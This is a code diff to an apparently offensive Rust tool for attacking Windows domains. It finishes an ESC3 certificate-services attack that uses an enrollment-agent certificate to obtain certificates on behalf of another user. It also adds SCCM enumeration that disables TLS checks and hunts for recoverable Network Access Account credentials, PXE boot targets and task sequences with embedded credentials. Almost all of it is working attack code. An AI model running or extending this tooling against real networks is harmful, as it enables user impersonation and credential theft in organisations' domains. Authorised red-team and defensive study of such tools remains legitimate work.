@@ -376,7 +376,7 @@ impl AdcsClient {
     /// Execute ESC3 attack - Enrollment Agent abuse
     ///
     /// Step 1: Request enrollment agent certificate
-    /// Step 2: Use it to request certificate on behalf of another user
+    /// Step 2: Use the agent cert to request a certificate on behalf of another user
     pub async fn attack_esc3(
         &self,
         agent_template: &str,
@@ -389,7 +389,7 @@ impl AdcsClient {
         );
 
         // Step 1: Get enrollment agent certificate
-        let (agent_csr, agent_key) =
+        let (agent_csr, _agent_key) =
             create_client_auth_csr("EnrollmentAgent", agent_template, None)?;
 
         let agent_response = self
@@ -407,16 +407,25 @@ impl AdcsClient {
             });
         }
 
+        let agent_cert_der = agent_response
+            .certificate
+            .as_ref()
+            .ok_or_else(|| OverthroneError::Adcs("No agent certificate in response".to_string()))?;
+
         info!("Enrollment agent certificate obtained");
 
-        // Step 2: Request certificate on behalf of target user
-        // In a real implementation, this would sign the CSR with the agent cert
+        // Step 2: Create CSR for the target user and submit it via the
+        // enrollment-agent endpoint, attaching the agent certificate so
+        // the CA issues the cert on behalf of target_user.
         let (target_csr, target_key) = create_esc1_csr(target_user, target_user, target_template)?;
 
-        // For now, submit directly (full ESC3 requires signing with agent cert)
+        // Parse CSR PEM to raw DER for the agent-submission API
+        let csr_der = pem::parse(&target_csr)
+            .map_err(|e| OverthroneError::Adcs(format!("Failed to parse target CSR: {e}")))?;
+
         let response = self
             .web_client
-            .submit_request(&target_csr, target_template, None)
+            .submit_request_with_agent(csr_der.contents(), target_template, agent_cert_der)
             .await?;
 
         if !response.is_issued() {
@@ -638,10 +647,14 @@ fn extract_serial(cert_der: &[u8]) -> Result<String> {
 }
 
 // ═══════════════════════════════════════════════════════════
-// SCCM Client (Stub - Future Implementation)
+// SCCM Client — HTTP-based SCCM/MECM enumeration
 // ═══════════════════════════════════════════════════════════
 
-/// SCCM/MECM client for configuration management abuse
+/// SCCM/MECM client for configuration management abuse.
+///
+/// Enumerates site configuration via the SMS Provider WMI web service
+/// (`/AdminService/wmi/`). Falls back to legacy
+/// `CMSiteInfo` endpoint when the modern API is unavailable.
 pub struct SccmClient {
     http_client: reqwest::Client,
 }
@@ -649,14 +662,214 @@ pub struct SccmClient {
 impl SccmClient {
     pub fn new() -> Self {
         Self {
-            http_client: reqwest::Client::new(),
+            http_client: reqwest::ClientBuilder::new()
+                .danger_accept_invalid_certs(true)
+                .timeout(std::time::Duration::from_secs(15))
+                .build()
+                .unwrap_or_else(|_| reqwest::Client::new()),
         }
     }
 
-    /// Enumerate SCCM configuration (stub)
-    pub async fn enumerate(&self, _site_server: Option<&str>) -> Result<SccmConfig> {
-        warn!("SCCM enumeration not yet implemented");
-        Ok(SccmConfig::default())
+    /// Enumerate SCCM site configuration from `site_server`.
+    ///
+    /// Uses the *AdminService* REST API exposed on the SMS Provider
+    /// (default: `https://<server>/AdminService/wmi/SMS_Site`).
+    /// When the admin service is unreachable we attempt legacy HTTP
+    /// endpoint `/SMS_MP/.sms_aut?SITESIGNCERT` for site code discovery.
+    pub async fn enumerate(&self, site_server: Option<&str>) -> Result<SccmConfig> {
+        let server = site_server.unwrap_or("localhost");
+
+        info!("SCCM: Enumerating site configuration from {}", server);
+
+        let mut config = SccmConfig {
+            site_server: server.to_string(),
+            ..Default::default()
+        };
+
+        // ── Try AdminService REST API ──────────────────────
+        let admin_base = format!("https://{}/AdminService/wmi", server);
+
+        // 1. Site info (SMS_Site)
+        match self.query_admin_service(&admin_base, "SMS_Site").await {
+            Ok(json) => {
+                if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                    for site in values {
+                        if let Some(code) = site.get("SiteCode").and_then(|c| c.as_str()) {
+                            config.site_code = code.to_string();
+                        }
+                    }
+                }
+                info!("SCCM: Site code = {}", config.site_code);
+            }
+            Err(e) => {
+                warn!("SCCM: AdminService SMS_Site query failed ({}), trying legacy", e);
+                // Fallback: try legacy management point
+                if let Ok(code) = self.discover_site_code_legacy(server).await {
+                    config.site_code = code;
+                }
+            }
+        }
+
+        // 2. Collections
+        if let Ok(json) = self.query_admin_service(&admin_base, "SMS_Collection").await {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                config.collections = values
+                    .iter()
+                    .filter_map(|c| {
+                        let name = c.get("Name")?.as_str()?;
+                        let id = c.get("CollectionID")?.as_str()?;
+                        Some(format!("{} ({})", name, id))
+                    })
+                    .collect();
+            }
+        }
+
+        // 3. Applications
+        if let Ok(json) = self.query_admin_service(&admin_base, "SMS_Application").await {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                config.applications = values
+                    .iter()
+                    .filter_map(|a| a.get("LocalizedDisplayName")?.as_str().map(String::from))
+                    .collect();
+            }
+        }
+
+        // 4. Site systems (distribution points, management points)
+        if let Ok(json) = self.query_admin_service(&admin_base, "SMS_SiteSystemSummarizer").await {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                config.site_systems = values
+                    .iter()
+                    .filter_map(|s| {
+                        let name = s.get("SiteSystem")?.as_str()?;
+                        let role = s.get("Role")?.as_str().unwrap_or("Unknown");
+                        Some(format!("{} [{}]", name, role))
+                    })
+                    .collect();
+            }
+        }
+
+        // 5. Check for common vulnerable settings (NAA, PXE, task sequences)
+        config.vulnerable_settings = self.check_vulnerable_settings(&admin_base).await;
+
+        info!(
+            "SCCM: Enumeration complete — {} collections, {} apps, {} systems, {} vulns",
+            config.collections.len(),
+            config.applications.len(),
+            config.site_systems.len(),
+            config.vulnerable_settings.len(),
+        );
+
+        Ok(config)
+    }
+
+    /// Query AdminService REST endpoint
+    async fn query_admin_service(
+        &self,
+        admin_base: &str,
+        class: &str,
+    ) -> std::result::Result<serde_json::Value, String> {
+        let url = format!("{}/{}", admin_base, class);
+        let resp = self
+            .http_client
+            .get(&url)
+            .send()
+            .await
+            .map_err(|e| format!("{}", e))?;
+
+        if !resp.status().is_success() {
+            return Err(format!("HTTP {}", resp.status()));
+        }
+
+        resp.json::<serde_json::Value>()
+            .await
+            .map_err(|e| format!("JSON parse: {}", e))
+    }
+
+    /// Legacy site-code discovery via management-point signature cert endpoint
+    async fn discover_site_code_legacy(&self, server: &str) -> std::result::Result<String, String> {
+        // The management point exposes the site signing cert at a well-known URL.
+        // The response body contains an X.509 cert whose CN includes the site code.
+        let url = format!("http://{}/SMS_MP/.sms_aut?SITESIGNCERT", server);
+        let resp = self
+            .http_client
+            .get(&url)
+            .send()
+            .await
+            .map_err(|e| format!("{}", e))?;
+
+        let body = resp.bytes().await.map_err(|e| format!("{}", e))?;
+
+        // Try to extract site code from the signing cert CN
+        if let Ok((_, cert)) = x509_parser::parse_x509_certificate(&body) {
+            if let Some(cn) = cert
+                .subject()
+                .iter_common_name()
+                .next()
+                .and_then(|cn| cn.as_str().ok())
+            {
+                // CN is typically "SMS Signing Certificate - <SiteCode>"
+                if let Some(code) = cn.split('-').last().map(|s| s.trim().to_string()) {
+                    if code.len() == 3 {
+                        return Ok(code);
+                    }
+                }
+            }
+        }
+
+        Err("Could not extract site code from signing cert".into())
+    }
+
+    /// Check for common SCCM misconfigurations
+    async fn check_vulnerable_settings(&self, admin_base: &str) -> Vec<String> {
+        let mut vulns = Vec::new();
+
+        // Check Network Access Account (NAA) — credentials stored in policy
+        if let Ok(json) = self
+            .query_admin_service(admin_base, "SMS_SCI_Reserved")
+            .await
+        {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                if !values.is_empty() {
+                    vulns.push("Network Access Account (NAA) configured — credentials may be recoverable from policy".to_string());
+                }
+            }
+        }
+
+        // Check PXE-enabled distribution points
+        if let Ok(json) = self
+            .query_admin_service(admin_base, "SMS_DistributionPointInfo")
+            .await
+        {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                for dp in values {
+                    let pxe = dp.get("IsPXE").and_then(|v| v.as_bool()).unwrap_or(false);
+                    let name = dp
+                        .get("ServerName")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+                    if pxe {
+                        vulns.push(format!("PXE-enabled DP: {} — possible PXE boot attack vector", name));
+                    }
+                }
+            }
+        }
+
+        // Check task sequences that may contain plaintext credentials
+        if let Ok(json) = self
+            .query_admin_service(admin_base, "SMS_TaskSequencePackage")
+            .await
+        {
+            if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
+                if !values.is_empty() {
+                    vulns.push(format!(
+                        "{} Task Sequence(s) found — may contain embedded credentials",
+                        values.len()
+                    ));
+                }
+            }
+        }
+
+        vulns
     }
 }
 
